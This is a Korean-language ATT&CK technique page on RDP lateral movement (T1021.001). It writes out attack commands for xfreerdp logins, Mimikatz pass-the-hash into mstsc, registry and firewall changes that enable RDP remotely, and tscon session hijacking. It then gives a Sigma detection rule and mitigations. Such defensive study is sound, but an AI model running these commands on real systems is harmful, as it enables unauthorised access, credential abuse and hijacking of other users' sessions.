# T1021.001 — Remote Desktop Protocol

## 개요

**TA0008 / T1021.001**  
RDP(Remote Desktop Protocol, 3389/tcp)를 이용해 내부 시스템에 원격 접속하는 기법입니다. APT 그룹이 가장 많이 사용하는 횡이동 수단 중 하나로, 유효한 자격증명 또는 Pass-the-Hash를 통해 접속합니다.

---

## 동작 방식

1. 대상 시스템에서 RDP 활성화 여부 확인 (3389/tcp 포트 스캔)
2. 유효한 자격증명, NTLM 해시, 또는 Kerberos 티켓으로 RDP 인증
3. 원격 데스크탑 세션에서 추가 도구 실행, 파일 전송, 정찰 수행
4. tscon을 이용한 세션 하이재킹으로 타 사용자 세션 탈취

---

## 주요 커맨드 / 실습

### xfreerdp / rdesktop 접속
```bash
# xfreerdp로 RDP 접속
xfreerdp /u:administrator /p:'Password123!' /v:192.168.1.10

# 도메인 지정
xfreerdp /u:administrator /d:corp.local /p:'Password123!' /v:192.168.1.10

# 전체 화면 모드
xfreerdp /u:administrator /p:'Password123!' /v:192.168.1.10 /f

# rdesktop
rdesktop -u administrator -p 'Password123!' 192.168.1.10
```

### Mimikatz Pass-the-Hash → RDP (Restricted Admin Mode)
```cmd
# Restricted Admin Mode 활성화 (대상 시스템에서)
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f

# Mimikatz PTH로 mstsc.exe 실행
mimikatz# sekurlsa::pth /user:administrator /domain:corp.local /ntlm:aad3b435b51404eeaad3b435b51404ee /run:mstsc.exe

# xfreerdp PTH
xfreerdp /u:administrator /pth:aad3b435b51404eeaad3b435b51404ee /v:192.168.1.10 /cert-ignore
```

### RDP 원격 활성화
```cmd
# 레지스트리로 RDP 활성화
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# 방화벽 예외 추가
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

# WMI로 원격 활성화
wmic /node:192.168.1.10 /user:administrator /password:Password123! path Win32_TerminalServiceSetting where AllowTSConnections=0 call SetAllowTSConnections 1
```

### 세션 하이재킹 (tscon)
```cmd
# 현재 RDP 세션 목록 확인
query session
query user

# SYSTEM 권한으로 다른 사용자 세션 탈취 (패스워드 없이)
# 먼저 SYSTEM 권한 획득 필요
tscon 2 /dest:rdp-tcp#1

# PsExec으로 SYSTEM에서 tscon 실행
PsExec.exe -s cmd.exe
tscon 2 /dest:console
```

## 탐지 방법

### Sigma Rule
```yaml
title: RDP Logon from Internal Network
id: b4e7a2c5-9f3d-4e8b-a6c1-3d7f5e2b9a4c
status: stable
description: Detects RDP interactive logons from internal IP addresses which may indicate lateral movement
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4624
        LogonType: 10
        IpAddress|startswith:
            - '10.'
            - '172.16.'
            - '192.168.'
    filter:
        SubjectUserName|endswith: '$'
    condition: selection and not filter
falsepositives:
    - Legitimate remote administration
    - Helpdesk remote support sessions
level: medium
tags:
    - attack.lateral_movement
    - attack.t1021.001
```

## 대응 방안

1. RDP 접근에 MFA 적용 (Microsoft Authenticator, Duo 등)
2. RDP를 인터넷에 직접 노출하지 않고 VPN/Jump Server 경유
3. Network Level Authentication(NLA) 필수 설정
4. Restricted Admin Mode 활성화 (PTH 일부 제한)
5. RDP 세션 로그(EventID 4624 LogonType 10) SIEM 연동
6. 불필요한 시스템의 RDP 비활성화
